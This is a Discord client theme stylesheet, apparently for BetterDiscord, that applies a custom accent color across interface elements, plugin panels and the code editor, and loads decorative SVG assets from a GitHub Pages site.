.mediaBarGrabber-1FqnbN,									/* progessbar			grabber								*/
.mediaBarProgress-1xaPtl,									/* progessbar			barfill								*/
.mediaBarProgress-1xaPtl::after,
.mediaBarProgress-1xaPtl::before {
	background-color: rgb(var(--vaccentcolor));
}
.mediaBarInteraction-37i2O4:hover .mediaBarGrabber-1FqnbN,
.mediaBarInteractionDragging-2QurIZ .mediaBarGrabber-1FqnbN {
	background-color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}

.theme-light .select-1Pkeg4:focus,							/* dropdown select		nitro subscription					*/
.theme-light .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-light .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-light .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) #b9bbbe;
}
.theme-dark .select-1Pkeg4:focus,
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-dark .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) rgba(0, 0, 0, 0.3);
}
.selectedIcon-3uS11H {										/* dropdown select		selected icon						*/
	color: rgb(var(--vaccentcolor));
}

/* ----		12.4.	TAGS							---- */

.botTagRegular-2HEhHi {										/* bottag				regular								*/
	background-color: rgb(var(--vaccentcolor));
}
.botTagInvert-18-95s {										/* bottag				inverted							*/
	color: rgb(var(--vaccentcolor));
}

.verified-1eC5dy {											/* verifiedbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh {											/* partneredbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh .flowerStar-1GeTsn {
	filter: brightness(75%);
}

/* ----		12.5.	ICONS							---- */

[style*="/assets/f78426a064bc9dd24847519259bc42af.png"],
[src*="/assets/f78426a064bc9dd24847519259bc42af.png"] {		/* avatars				clyde								*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/clydeicon_details.svg) center/contain no-repeat !important;
}
[style*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"],
[src*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"] {		/* avatars				blue discord						*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/blurplediscordicon_details.svg) center/contain no-repeat !important;
}

/* ----		12.6.	SCROLLBARS						---- */

.scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-dark .scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerWrap-2lJEkd .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollbarDefault-3COgCQ::-webkit-scrollbar-thumb {
	background-color: rgb(var(--vaccentcolor));
}

::-webkit-scrollbar-corner,
#app-mount ::-webkit-scrollbar-corner {
	background-color: transparent;
}

/* ----		12.7.	NOTIFICATIONBAR					---- */

.colorPremiumTier1-3D7SPt {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7));
}
.colorPremiumTier1-3D7SPt .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorPremiumTier2-dCdap5 {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.colorPremiumTier2-dCdap5 .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor)) !important;
}
.notice-2X5hT5 {											/* preview notice											*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-2PWmas:hover {										/* preview notice		button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-1tZwqv {											/* role notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-3Ijpww:hover {										/* role notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-3uyY6c {											/* rules notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-gP4R86:hover {										/* rules notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}

/* ----		12.8.	TOOLTIPS						---- */

#app-mount .tooltipBrand-g03Nz8 {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tooltipBrand-g03Nz8 .tooltipPointer-3ZfirK {
	border-top-color: rgb(var(--vaccentcolor));
}

.content-3O0wBS {
	background-color: rgb(var(--vaccentcolor));
}
.content-3O0wBS	.button-3zdF3z {
	color: rgb(var(--vaccentcolor));
}
.pointer-3ClhC2 {
	border-top-color: rgb(var(--vaccentcolor));
}

/* ----		12.9.	TOASTS							---- */

.toast-brand {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-WfDfzD .bg-8df5St {
	background-color: rgb(var(--vaccentcolor));
}
.colorCustom-WKsPgT .bg-8df5St[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.bar-95Sdw1.customBar-3RsUzs[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		13.		BDSUPPORT						~~~~ */

#bd-pub-button {
	color: var(--text-normal);
	transition: background-color .15s ease-out, color .15s ease-out;
}
#bd-pub-button:hover {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background-color: rgb(var(--vaccentcolor));
}
#bd-pub-button:active {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background: var(--vaccentcolor-hover);
}
#pubslayer button:hover {
	background: var(--vaccentcolor-hover);
}
#pubslayer button:active {
	background: var(--vaccentcolor-active);
}
.bd-server-card.bd-server-card-pinned::after {
	background: var(--bd-blue);
}

.bd-modal-wrapper .footer button {
	background: var(--bd-blue);
}
.bd-modal-wrapper .footer button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-modal-wrapper .footer button:active {
	background: var(--vaccentcolor-active);
}
.bd-modal-wrapper .error-link {
	color: var(--bd-blue);
}

.bd-pfbtn {
	background: var(--bd-blue);
}
.bd-pfbtn:hover {
	background: var(--vaccentcolor-hover);
}
.bd-pfbtn:active {
	background: var(--vaccentcolor-active);
}

.bd-button {
	background: var(--bd-blue);
}
.bd-button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-button:active {
	background: var(--vaccentcolor-active);
}

.bd-addon-views .bd-view-button.selected {
	background: var(--bd-blue);
}

.bd-addon-list .bd-footer a {
	color: var(--bd-blue);
}

.bd-server-tag {
	background: var(--bd-blue);
}

#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked,
.bd-switch-checked {
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:hover,
.bd-switch-checked:hover {
	background: var(--vaccentcolor-hover);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:active,
.bd-switch-checked:active {
	background: var(--vaccentcolor-active);
}
.bd-switch::before {
	box-shadow: none;
}

html .monaco-editor .find-widget .monaco-inputbox.synthetic-focus {
	outline-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .monaco-editor-hover a {
	color: rgb(var(--vaccentcolor));
}
html .monaco-editor [class*="arrow-decoration"] {
	border-bottom-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .focused .selected-text {
	background-color: rgb(var(--vaccentcolor));
}

html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) {
	background-color: rgb(var(--vaccentcolor));
	color: #ffffff;
}
html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) .results-group {
	color: #ffffff !important;
}

html .monaco-editor [style*="background-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="background: rgb(0, 122, 204)"],
html .monaco-editor [style*="background-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="background: rgb(14, 122, 192)"],
html .monaco-editor [style*="background-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="background: rgb(14, 99, 156)"],
html .monaco-editor [style*="background-color: rgb(9, 71, 113)"],
html .monaco-editor [style*="background: rgb(9, 71, 113)"] {
	background: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.9)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.9)"] {
	background: rgba(var(--vaccentcolor), 0.9) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.8)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.8)"] {
	background: rgba(var(--vaccentcolor), 0.8) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.7)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.7)"] {
	background: rgba(var(--vaccentcolor), 0.7) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.6)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.6)"] {
	background: rgba(var(--vaccentcolor), 0.6) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.5)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.5)"] {
	background: rgba(var(--vaccentcolor), 0.5) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.4)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.4)"] {
	background: rgba(var(--vaccentcolor), 0.4) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.3)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.3)"] {
	background: rgba(var(--vaccentcolor), 0.3) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.2)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.2)"] {
	background: rgba(var(--vaccentcolor), 0.2) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.1)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.1)"] {
	background: rgba(var(--vaccentcolor), 0.1) !important;
}
html .monaco-editor [style*="border-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-color: rgb(9, 71, 113)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-top-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-top-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-top-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-top-color: rgb(9, 71, 113)"] {
	border-top-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-right-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-right-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-right-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-right-color: rgb(9, 71, 113)"] {
	border-right-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-bottom-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-bottom-color: rgb(9, 71, 113)"] {
	border-bottom-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-left-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-left-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-left-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-left-color: rgb(9, 71, 113)"] {
	border-left-color: rgb(var(--vaccentcolor)) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(62, 130, 229)"],
.embedFull-2tM8--[style*="border-color: rgb(62, 130, 226)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		14.		POWERCORDSUPPORT				~~~~ */

html .powercord-toast[data-toast-type=info] .icon {
	color: rgb(var(--vaccentcolor));
}
html .powercord-toast .progressBar-3u8FBM {
	background-color: rgb(var(--vaccentcolor));
}

html .powercord-updater .debug-info b {
	color: rgb(var(--vaccentcolor));
}


/* ~~~~		15.		PLUGINSUPPORT					~~~~ */

/* ----		15.1.	IMAGEZOOM						---- */

.zoomLens-uOK8xV {
	border-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.2.	HIDEUTILS						---- */

#HideUtils-Settings button {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.3.	READALLNOTIFICATIONSBUTTON		---- */

.wrapper-1BJsBx:active .childWrapper-anI2G9.button-Jt-tIg{
	background: var(--vaccentcolor-hover);
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
}

/* ----		15.4.	SERVERSEARCH					---- */

#server-search .wrapper-25eVIn {
	background-color: rgb(47, 49, 54) !important;
	transition: background-color .16s ease-out;
}
#server-search .wrapper-25eVIn:hover {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.5.	CHANNELTABS						---- */

.channelTabs-unreadBadge:not(.channelTabs-noUnread) {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		16.		THEMESUPPORT					~~~~ */

/* ----		16.1.	THEMEDEVBADGE					---- */

#app-mount .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}
#app-mount .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
#app-mount .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

:root {
	--daccentcolor: 114,137,218;
	--vaccentcolor: var(--accentcolor, var(--daccentcolor));
	--dlinkcolor: 0,176,244;
	--vlinkcolor: var(--linkcolor, var(--dlinkcolor));

	--dfontwhite1: 255,255,255;

	--vaccentcolor-hover: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor-active: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));

	--bdfdb-blurple: rgb(var(--vaccentcolor)) !important;
	--bd-blue: rgb(var(--vaccentcolor)) !important;
	--bd-blue-hover: var(--vaccentcolor-hover) !important;
	--bd-blue-active: var(--vaccentcolor-active) !important;
	--blurple: rgb(var(--vaccentcolor)) !important;
}
.content-1o0f9g {
    background: var(--background-primary) !important; }
.theme-dark, .theme-light {
	--text-link: rgb(var(--vlinkcolor));
	--focus-primary: rgb(var(--vlinkcolor));
	--radio-group-dot-foreground: rgb(var(--vaccentcolor));
}
.theme-light {
	--logo-primary: rgb(var(--vaccentcolor));
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugin Themes ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.hljs ol {
    list-style: none;
    counter-reset: linenumbers;
}

.hljs ol li {
    text-indent: -4ch;
    margin-left: 3.5ch;
    padding-left: 0.5ch;
    border-left: 1px solid rgba(0,0,0,0.2);
}

.hljs ol li::before {
    color: rgba(127,127,127,0.5);
    display: inline-block;
    width: 3ch;
    margin-right: 0.5ch;
    padding-right: 0.5ch;
    text-align: right;
    counter-increment: linenumbers;
    content: counter(linenumbers);
    -webkit-user-select: none;
    user-select: none;
}

/* ~~~~		0.		TABLE OF CONTENTS				~~~~ */
/*
	1.	GUILDLIST
	2.	CHANNELLIST
	3.	CHAT
		1.	MESSAGES
		2.	TEXTAREA
		3.	AUTOCOMPLETEMENU
		4.	MEMBERLIST
		5.	SEARCHPAGE
		6.	CALL
	4.	PEOPLES
	5.	STORE/NITRO
	6.	LIBRARY
	7.	DISCOVERY
	8.	USERSETTINGS
	9.	GUILDSETTINGS
	10.	MODALS
		1.	USERMODAL
		2.	GUILDADD/CREATION
		3.	REGIONSELECTMODAL
		4.	UPLOADMODAL
		5.	KEYBOARDSHORTCUTSMODAL
		6.	LOGINSCREEN
		7.	DOWNLOADAPPMODAL
		8.	GUILDBOOSTMODAL
		9.	STREAMSETTINGSMODAL
		10.	DISPATCHERRORMODAL
		11.	CHANGELOGMODAL
		12.	SCREENSHAREMODAL
		13.	PHONEVERIFICATIONMODAL
	11.	POPOUTS
		1.	CONTEXTMENU
		2.	USERPOPOUT
		3.	EMOJIPICKER
		4.	PINS/MENTIONS
		5.	SEARCHPOPOUT
	12.	GENERAL
		1.	TEXT
		2.	BUTTONS
		3.	INPUTS
		4.	TAGS
		5.	ICONS
		6.	SCROLLBARS
		7.	NOTIFICATIONBAR
		8.	TOOLTIPS
		9.	TOASTS
	13.	BDSUPPORT
	14.	POWERCORDSUPPORT
	15.	PLUGINSUPPORT
		1.	IMAGEZOOM
		2.	HIDEUTILS
		3.	READALLNOTIFICATIONSBUTTON
		4.	SERVERSEARCH
		5.	CHANNELTABS
	16.	THEMESUPPORT
		1.	THEMEDEVBADGE
*/


/* ~~~~		1.		GUILDLIST						~~~~ */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9,		/* home/acronym												*/
.wrapper-1BJsBx:hover .childWrapper-anI2G9 {
	background-color: rgb(var(--vaccentcolor));
}

.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.4)"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.folderIconWrapper-226oVY svg[style^="color: rgb(114, 137, 218)"],
.folderIconWrapper-226oVY svg[style*=" color: rgb(114, 137, 218)"] {
	color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		2.		CHANNELLIST						~~~~ */

.background-2uufRq {										/* guild header			partnerbadge						*/
	color: rgb(var(--vaccentcolor));
}
.iconTierThree-3EAOB7 {										/* guild header			icontier3							*/
	color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8 {							/* guild header			subscribetooltip					*/
	background-color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8::after {
	border-bottom-color: rgb(var(--vaccentcolor));
}

.channelNotice-1-XFjC::before,								/* channel notice											*/
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events:none;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4 {
	background: transparent;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4::before {
	filter: grayscale(0.5);
	background: url(https://discord.com/assets/8fdb69b7684b8e1ecb3fdde909daca41.svg) center 35px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_premium_bg.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_premium_accent.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_upsell_bg.svg) center 12px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_upsell_accent.svg) center 12px no-repeat;
}


/* ~~~~		3.		CHAT							~~~~ */

/* ----		3.1.	MESSAGES						---- */

.newMessagesBar-265mhP {									/* new messagesbar											*/
	background-color: rgb(var(--vaccentcolor));
}

.hasMore-3POVhk {											/* hasmore messagesbar										*/
	color: rgb(var(--vaccentcolor));
}

.backgroundFlash-24qWLN[style*="background-color: rgb(114, 137, 218)"],
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.0"] {
	background-color: rgba(var(--vaccentcolor), 0.0) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.ephemeral-1PsL1r,											/* localbot				container							*/
.replying-1x3H0T {											/* replying				container							*/
	background-color: rgba(var(--vaccentcolor), 0.05);
}
.ephemeral-1PsL1r::before,									/* localbot				before								*/
.replying-1x3H0T::before {									/* replying				before								*/
	background-color: rgb(var(--vaccentcolor));
}
.message-2qnXI6.ephemeral-1PsL1r.selected-2P5D_Z,
.mouse-mode.full-motion .ephemeral-1PsL1r:hover,
.mouse-mode .ephemeral-1PsL1r:hover,
.message-2qnXI6.replying-1x3H0T.selected-2P5D_Z,
.mouse-mode.full-motion .replying-1x3H0T:hover,
.mouse-mode .replying-1x3H0T:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
}
.ephemeralMessage-1fEWtQ a {								/* localbot				operations							*/
	color: rgb(var(--vaccentcolor));
}

.operations-36ENbA > a {									/* message				operations							*/
	color: rgb(var(--vaccentcolor));
}

.icon-360yEu {												/* systemmessage		guild sub easter egg icon			*/
	color: rgb(var(--vaccentcolor));
}

.message-15tBk4 strong,										/* mention				in header							*/
.wrapper-3WhCwL {											/* mention													*/
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}
.message-15tBk4 strong:hover,
.interactive:hover {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .mentioned-xhSam7 .mention.interactive:hover {
	color: rgb(var(--vaccentcolor));
}

.reactionMe-wv5HKu .reactionCount-2mvXRV,					/* reaction				count me							*/
.reactionMe-wv5HKu:hover .reactionCount-2mvXRV {
	color: rgb(var(--vaccentcolor));
}
.reaction-1hd86g.reactionMe-wv5HKu {						/* reaction				wrapper me							*/
	background-color: rgba(var(--vaccentcolor), 0.3);
}
															/* attachment			upload bar							*/
.progressBar-3u8FBM[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		3.2.	TEXTAREA						---- */
															/* textarea				follow channel icon					*/
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/chatnotice_followchannel_bg.svg) center/contain no-repeat;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 8px;
	left: 16px;
	width: 47px;
	height: 60px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/chatnotice_followchannel_accent.svg) center/contain no-repeat;
}

/* ----		3.3.	AUTOCOMPLETEMENU				---- */

#app-mount .active-2awTSY {									/* autocomplete			option active						*/
